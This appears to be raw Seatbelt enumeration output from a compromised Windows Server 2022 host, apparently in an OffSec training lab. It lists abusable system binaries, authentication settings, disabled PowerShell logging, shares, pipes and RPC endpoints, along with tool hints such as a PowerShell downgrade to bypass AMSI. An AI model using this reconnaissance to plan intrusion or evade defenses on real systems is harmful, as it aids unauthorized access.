Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.20348.1_none_516cae1ed94d63aa\url.dll
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15806.0_none_96eed05805687d60\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15806.0_none_de9c072f19e4a666\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
Path: C:\Windows\System32\verclsid.exe
Path: C:\Windows\SysWOW64\verclsid.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.20348.1_none_4555ceb9dc7ae299\verclsid.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.20348.1_none_4faa790c10dba494\verclsid.exe
Path: C:\Program Files\Windows Mail\wab.exe
Path: C:\Program Files (x86)\Windows Mail\wab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.20348.1_none_cc185b04a09934db\wab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.20348.1_none_d66d0556d4f9f6d6\wab.exe
Path: C:\Windows\System32\winrm.vbs
Path: C:\Windows\SysWOW64\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.1_none_53d472e3760e62ce\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.803_none_b325d6f536f7f962\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.1_none_5e291d35aa6f24c9\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.803_none_bd7a81476b58bb5d\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.803_none_b325d6f536f7f962\f\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.803_none_b325d6f536f7f962\r\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.803_none_bd7a81476b58bb5d\f\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.20348.803_none_bd7a81476b58bb5d\r\winrm.vbs
Path: C:\Windows\System32\wbem\WMIC.exe
Path: C:\Windows\SysWOW64\wbem\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.20348.1_none_2b18d2e295dd8894\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.20348.1_none_356d7d34ca3e4a8f\WMIC.exe
Path: C:\Windows\System32\wscript.exe
Path: C:\Windows\SysWOW64\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.1_none_d1d75099c96087f4\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_310538a58a65376c\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.1_none_dc2bfaebfdc149ef\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_3b59e2f7bec5f967\wscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_310538a58a65376c\f\wscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_310538a58a65376c\r\wscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_3b59e2f7bec5f967\f\wscript.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.20348.230_none_3b59e2f7bec5f967\r\wscript.exe
Path: C:\Windows\System32\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.20348.1_none_0c5d81e197e6b55e\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.20348.740_none_6b80a37f58f3728a\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.20348.740_none_6b80a37f58f3728a\f\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.20348.740_none_6b80a37f58f3728a\r\wsl.exe
Path: C:\Windows\System32\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.20348.1_none_4fe6f77bcf08a629\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.20348.946_none_af101ea1900ff5ad\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.20348.946_none_af101ea1900ff5ad\f\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.20348.946_none_af101ea1900ff5ad\r\WSReset.exe
Path: C:\Windows\System32\xwizard.exe
Path: C:\Windows\SysWOW64\xwizard.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.20348.1_none_e2630e57018a80f9\xwizard.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.20348.1_none_ecb7b8a935eb42f4\xwizard.exe
Path: C:\Windows\System32\zipfldr.dll
Path: C:\Windows\SysWOW64\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.20348.1_none_017547bffe4f1d14\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.20348.1_none_0bc9f21232afdf0f\zipfldr.dll
Found: 488 LOLBAS

To see how to use the LOLBAS that were found go to https://lolbas-project.github.io/
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 708
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1
====== MappedDrives ======

Mapped Drives (via WMI)

====== McAfeeConfigs ======

====== McAfeeSiteList ======

ERROR:   [!] Terminating exception running command 'McAfeeSiteList': System.NullReferenceException: Object reference not set to an instance of an object.
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MicrosoftUpdates ======

Enumerating *all* Microsoft updates

ERROR:   [!] Terminating exception running command 'MicrosoftUpdates': System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at Seatbelt.Commands.Windows.MicrosoftUpdateCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== NamedPipes ======

1576,svchost,atsvc
924,svchost,epmapper
1204,svchost,eventlog
    SDDL         : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
2748,vmtoolsd,giTrayPipefe4dcf99-69fe-474d-ad98-979e4f1ad5c1
576,wininit,InitShutdown
708,lsass,lsass
984,svchost,LSM_API_service
5012,snmptrap,MGMTAPI
2232,sqlservr,MICROSOFT##WID\tsql\query
5056,sqlservr,MSSQL$SQLEXPRESS\sql\query
692,services,ntsvcs
0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
0,Unk,ProtectedPrefix\LocalService\FTHPIPE
6540,powershell,PSHost.133661252225663387.6540.DefaultAppDomain.powershell
3148,svchost,ROUTER
    SDDL         : O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
692,services,scerpc
2176,spoolsv,spoolss
5056,sqlservr,SQLLocal\SQLEXPRESS
    SDDL         : O:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133G:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133)
2560,svchost,srvsvc
2688,svchost,trkwks
2732,VGAuthService,vgauth-service
    SDDL         : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
664,svchost,W32TIME_ALT
0,Unk,Winsock2\CatalogChangeListener-108c-0
0,Unk,Winsock2\CatalogChangeListener-240-0
0,Unk,Winsock2\CatalogChangeListener-2b4-0
0,Unk,Winsock2\CatalogChangeListener-2c4-0
0,Unk,Winsock2\CatalogChangeListener-39c-0
0,Unk,Winsock2\CatalogChangeListener-3d8-0
0,Unk,Winsock2\CatalogChangeListener-4b4-0
0,Unk,Winsock2\CatalogChangeListener-628-0
0,Unk,Winsock2\CatalogChangeListener-80c-0
0,Unk,Winsock2\CatalogChangeListener-880-0
1912,svchost,wkssvc
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

  Name                           : ADMIN$
  Path                           : C:\Windows
  Description                    : Remote Admin
  Type                           : Disk Drive Admin

  Name                           : C$
  Path                           : C:\
  Description                    : Default share
  Type                           : Disk Drive Admin

  Name                           : IPC$
  Path                           : 
  Description                    : Remote IPC
  Type                           : IPC Admin

====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
====== OfficeMRUs ======

Enumerating Office most recently used files for the last 7 days

  App       User                     LastAccess    FileName
  ---       ----                     ----------    --------
====== OneNote ======


    OneNote files (.NET v4.5):



    OneNote files (.NET v4.5 Classic):



    OneNote files (Administrator):



    OneNote files (administrator.MEDTECH):



    OneNote files (joe):



    OneNote files (offsec):


====== OptionalFeatures ======

State    Name                                               Caption
Enabled  DamgmtTools                                        DirectAccess Server Management Tools
Enabled  FileAndStorage-Services                            
Enabled  IIS-ApplicationDevelopment                         Application Development Features
Enabled  IIS-ASPNET45                                       ASP.NET 4.8
Enabled  IIS-CommonHttpFeatures                             Common HTTP Features
Enabled  IIS-DefaultDocument                                Default Document
Enabled  IIS-DirectoryBrowsing                              Directory Browsing
Enabled  IIS-HealthAndDiagnostics                           Health and Diagnostics
Enabled  IIS-HttpCompressionStatic                          Static Content Compression
Enabled  IIS-HttpErrors                                     HTTP Errors
Enabled  IIS-HttpLogging                                    HTTP Logging
Enabled  IIS-HttpRedirect                                   HTTP Redirection
Enabled  IIS-IPSecurity                                     IP Security
Enabled  IIS-ISAPIExtensions                                ISAPI Extensions
Enabled  IIS-ISAPIFilter                                    ISAPI Filters
Enabled  IIS-ManagementConsole                              IIS Management Console
Enabled  IIS-ManagementScriptingTools                       IIS Management Scripts and Tools
Enabled  IIS-NetFxExtensibility45                           .NET Extensibility 4.8
Enabled  IIS-Performance                                    Performance Features
Enabled  IIS-RequestFiltering                               Request Filtering
Enabled  IIS-Security                                       Security
Enabled  IIS-StaticContent                                  Static Content
Enabled  IIS-WebServer                                      World Wide Web Services
Enabled  IIS-WebServerManagementTools                       Web Management Tools
Enabled  IIS-WebServerRole                                  Internet Information Services
Enabled  KeyDistributionService-PSH-Cmdlets                 Key Distribution Service PowerShell Cmdlets
Enabled  MediaPlayback                                      Media Features
Enabled  Microsoft-Windows-GroupPolicy-ServerAdminTools-Update 
Enabled  Microsoft-Windows-MultiPoint-Connector             
Enabled  Microsoft-Windows-PhotoBasic                       
Enabled  MicrosoftWindowsPowerShell                         Windows PowerShell
Enabled  MicrosoftWindowsPowerShellRoot                     Windows PowerShell
Enabled  MicrosoftWindowsPowerShellV2                       Windows PowerShell 2.0 Engine
Enabled  Microsoft-Windows-Printing-PremiumTools            
Enabled  Microsoft-Windows-StorageService                   
Enabled  NetFx4                                             .NET Framework 4.8
Enabled  NetFx4Extended-ASPNET45                            ASP.NET 4.8
Enabled  NetFx4ServerFeatures                               .NET Framework 4.8 Features
Enabled  Printing-Client                                    Windows Server Print Client
Enabled  Printing-Client-Gui                                Windows Server Print Client Management UI
Enabled  Printing-PrintToPDFServices-Features               Microsoft Print to PDF
Enabled  Printing-XPSServices-Features                      Microsoft XPS Document Writer
Enabled  RasCMAK                                            RAS Connection Manager Administration Kit (CMAK)
Enabled  RasRoutingProtocols                                Ras Server Routing Protocols
Enabled  RasServerAdminTools                                Ras Server MMC feature
Enabled  RemoteAccess                                       Remote Access
Enabled  RemoteAccessMgmtTools                              Remote Access Management Tools
Enabled  RemoteAccessPowerShell                             Remote Access module for Windows PowerShell
Enabled  RemoteAccessServer                                 Remote Access Server
Enabled  RSAT                                               Root node for feature RSAT tools
Enabled  SearchEngine-Client-Package                        Windows Search
Enabled  Server-Core                                        Microsoft-Windows-Server-Core-Package-DisplayName
Enabled  ServerCore-Drivers-General                         Server Core Drivers
Enabled  ServerCore-Drivers-General-WOW64                   Server Core WOW64 Drivers
Enabled  ServerCoreFonts-NonCritical-Fonts-BitmapFonts      Server Core non-critical fonts - (Fonts-BitmapFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-MinConsoleFonts  Server Core non-critical fonts - (Fonts-MinConsoleFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-Support          Server Core non-critical fonts components - (Fonts-Support).
Enabled  ServerCoreFonts-NonCritical-Fonts-TrueType         Server Core non-critical fonts - (Font-TrueTypeFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-UAPFonts         Server Core non-critical fonts - (Fonts-UAPFonts).
Enabled  ServerCore-WOW64                                   Microsoft Windows ServerCore WOW64
Enabled  Server-Drivers-General                             Server Drivers
Enabled  Server-Drivers-Printers                            Server Printer Drivers
Enabled  Server-Gui-Mgmt                                    Microsoft-Windows-Server-Gui-Mgmt-Package-DisplayName
Enabled  ServerManager-Core-RSAT                            
Enabled  ServerManager-Core-RSAT-Role-Tools                 
Enabled  Server-Psh-Cmdlets                                 Microsoft Windows ServerCore Foundational PowerShell Cmdlets
Enabled  Server-Shell                                       Microsoft-Windows-Server-Shell-Package-DisplayName
Enabled  SmbDirect                                          SMB Direct
Enabled  Storage-Services                                   
Enabled  SystemDataArchiver                                 System Data Archiver
Enabled  TlsSessionTicketKey-PSH-Cmdlets                    TLS Session Ticket Key Commands
Enabled  Tpm-PSH-Cmdlets                                    Trusted Platform Module Service PowerShell Cmdlets
Enabled  WCF-Services45                                     WCF Services
Enabled  WCF-TCP-PortSharing45                              TCP Port Sharing
Enabled  Windows-Defender                                   Microsoft Defender Antivirus
Enabled  Windows-Internal-Database                          Windows Internal Database
Enabled  WindowsMediaPlayer                                 Windows Media Player
Enabled  WindowsServerBackupSnapin                          Windows Server Backup SnapIn
Enabled  Xps-Foundation-Xps-Viewer                          XPS Viewer
====== OracleSQLDeveloper ======

====== OSInfo ======

  Hostname                      :  WEB02
  Domain Name                   :  dmz.medtech.com
  Username                      :  NT Service\MSSQL$SQLEXPRESS
  ProductName                   :  Windows Server 2022 Standard
  EditionID                     :  ServerStandard
  ReleaseId                     :  2009
  Build                         :  20348.1006
  BuildBranch                   :  fe_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTimeUtc (approx)          :  7/22/2024 11:51:13 AM (Total uptime: 00:01:02:52)
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False
  CurrentTimeUtc                :  7/22/2024 12:54:05 PM (Local time: 7/22/2024 5:54:05 AM)
  TimeZone                      :  Pacific Standard Time
  TimeZoneOffset                :  -07:00:00
  InputLanguage                 :  US
  InstalledInputLanguages       :  
  MachineGuid                   :  0eb17018-2f38-4fe7-823e-e2863a26d4bd
====== OutlookDownloads ======

====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)
====== PowerShell ======


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.20348.1

  Transcription Logging Settings
      Enabled            : False
      Invocation Logging : False
      Log Directory      : 

  Module Logging Settings
      Enabled             : False
      Logged Module Names :

  Script Block Logging Settings
      Enabled            : False
      Invocation Logging : False

  Anti-Malware Scan Interface (AMSI)
      OS Supports AMSI: True
        [!] You can do a PowerShell version downgrade to bypass AMSI.
====== PowerShellEvents ======

Searching script block logs (EID 4104) for sensitive data.

====== PowerShellHistory ======

====== Printers ======

  Name                           : Microsoft XPS Document Writer
  Status                         : Unknown
  Sddl                           : O:SYD:(A;;LCSWSDRCWDWO;;;LA)(A;OIIO;RPWPSDRCWDWO;;;LA)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
  IsDefault                      : False
  IsNetworkPrinter               : False

  Name                           : Microsoft Print to PDF
  Status                         : Unknown
  Sddl                           : O:SYD:(A;;LCSWSDRCWDWO;;;LA)(A;OIIO;RPWPSDRCWDWO;;;LA)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
  IsDefault                      : True
  IsNetworkPrinter               : False

====== ProcessCreationEvents ======

ERROR: Unable to collect. Must be an administrator.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

====== ProcessOwners ======

====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== PuttyHostKeys ======

====== PuttySessions ======

====== RDCManFiles ======

====== RDPSavedConnections ======

====== RDPSessions ======

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication: 
  BlockClipboardRedirection:  
  BlockComPortRedirection:    
  BlockDriveRedirection:      
  BlockLptPortRedirection:    
  BlockPnPDeviceRedirection:  
  BlockPrinterRedirection:    
  AllowSmartCardRedirection:  

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== RecycleBin ======

Recycle Bin Files Within the last 30 Days

====== reg ======

HKLM\Software ! (default) : 
HKLM\Software\Classes ! (default) : 
HKLM\Software\Clients ! (default) : 
HKLM\Software\CVSM ! (default) : 
HKLM\Software\DefaultUserEnvironment ! (default) : 
HKLM\Software\Google ! (default) : 
HKLM\Software\Intel ! (default) : 
HKLM\Software\Microsoft ! (default) : 
HKLM\Software\Mozilla ! (default) : 
HKLM\Software\ODBC ! (default) : 
HKLM\Software\OpenSSH ! (default) : 
HKLM\Software\Partner ! (default) : 
HKLM\Software\Policies ! (default) : 
HKLM\Software\RegisteredApplications ! (default) : 
HKLM\Software\Setup ! (default) : 
HKLM\Software\VMware, Inc. ! (default) : 
HKLM\Software\Windows ! (default) : 
HKLM\Software\Wow6432Node ! (default) : 
====== RPCMappedEndpoints ======

  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49668]
  a111f1c5-5923-47c0-9a68-d0bafb577901 v1.0 (NetSetup API): ncalrpc:[LRPC-f6f70018ac01685019]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[OLEDF1D2F6996EA96BD8D34F3006E4A]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[LRPC-286704dda6c178a487]
  a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 (LicenseManager): ncalrpc:[LicenseServiceEndpoint]
  0767a036-0d22-48aa-ba69-b619480f38cb v1.0 (PcaSvc): ncalrpc:[LRPC-39c3b0a54d77564844]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[OLE1E8E9ED2BF59832D109888A5F4E8]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[LRPC-14651f8c76d2cceada]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[OLE1E8E9ED2BF59832D109888A5F4E8]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[LRPC-14651f8c76d2cceada]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[OLE1E8E9ED2BF59832D109888A5F4E8]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[LRPC-14651f8c76d2cceada]
  d8140e00-5c46-4ae6-80ac-2f9a76df224c v0.0 (): ncalrpc:[LRPC-8ac10e231bbfb27b16]
  d249bd56-4cc0-4fd3-8ce6-6fe050d590cb v0.0 (): ncalrpc:[LRPC-8ac10e231bbfb27b16]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0A4A11]
  12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 (Secure Desktop LRPC interface): ncalrpc:[WMsgKRpc0A4A11]
  367abb81-9844-35f1-ad32-98f038001003 v2.0 (): ncacn_ip_tcp:[49671]
  4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 (): ncalrpc:[LRPC-f57ed816f84354c9f1]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-1fe88831f91830c985]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-1fe88831f91830c985]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-1fe88831f91830c985]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[OLEC6E0A1573B6AFDB0AAF4F6B66102]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3cd275166107d25874]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncacn_np:[\\PIPE\\ROUTER]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[RasmanLrpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[VpnikeRpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[LRPC-692df005c4744827d7]
  6b5bdd1e-528c-422c-af8c-a4079be4fe48 v1.0 (Remote Fw APIs): ncalrpc:[ipsec]
  6b5bdd1e-528c-422c-af8c-a4079be4fe48 v1.0 (Remote Fw APIs): ncacn_ip_tcp:[49670]
  7df1ceae-de4e-4e6f-ab14-49636e7c2052 v1.0 (): ncalrpc:[LRPC-d7c46ec8ff6ba5ce82]
  d4051bde-9cdd-4910-b393-4aa85ec3c482 v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  d4051bde-9cdd-4910-b393-4aa85ec3c482 v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[OLE768E0BFF63CDCCB8B0B12F5D8256]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[LRPC-92b10acbb5cd2f473e]
  509bc7ae-77be-4ee8-b07c-0d096bb44345 v1.0 (): ncalrpc:[OLE312428F46AD4015A0212F647D0BE]
  509bc7ae-77be-4ee8-b07c-0d096bb44345 v1.0 (): ncalrpc:[LRPC-a2072d11aad322c590]
  98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 (XactSrv service): ncalrpc:[LRPC-242f2838794e31743c]
  1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 (IdSegSrv service): ncalrpc:[LRPC-242f2838794e31743c]
  b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 (): ncalrpc:[LRPC-1d3fdc08872d092fb9]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[OLE9CA9766BB6338BAE18F19B5D5B56]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[LRPC-03adcd721cf6643419]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[OLE9CA9766BB6338BAE18F19B5D5B56]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[LRPC-03adcd721cf6643419]
  a398e520-d59a-4bdd-aa7a-3c1e0303a511 v1.0 (IKE/Authip API): ncalrpc:[LRPC-dd11c33ef2f2a5803b]
  12345678-1234-abcd-ef00-0123456789ab v1.0 (): ncalrpc:[LRPC-cee895145d69e75581]
  12345678-1234-abcd-ef00-0123456789ab v1.0 (): ncacn_ip_tcp:[49669]
  0b6edbfa-4a24-4fc6-8a23-942b1eca65d1 v1.0 (): ncalrpc:[LRPC-cee895145d69e75581]
  0b6edbfa-4a24-4fc6-8a23-942b1eca65d1 v1.0 (): ncacn_ip_tcp:[49669]
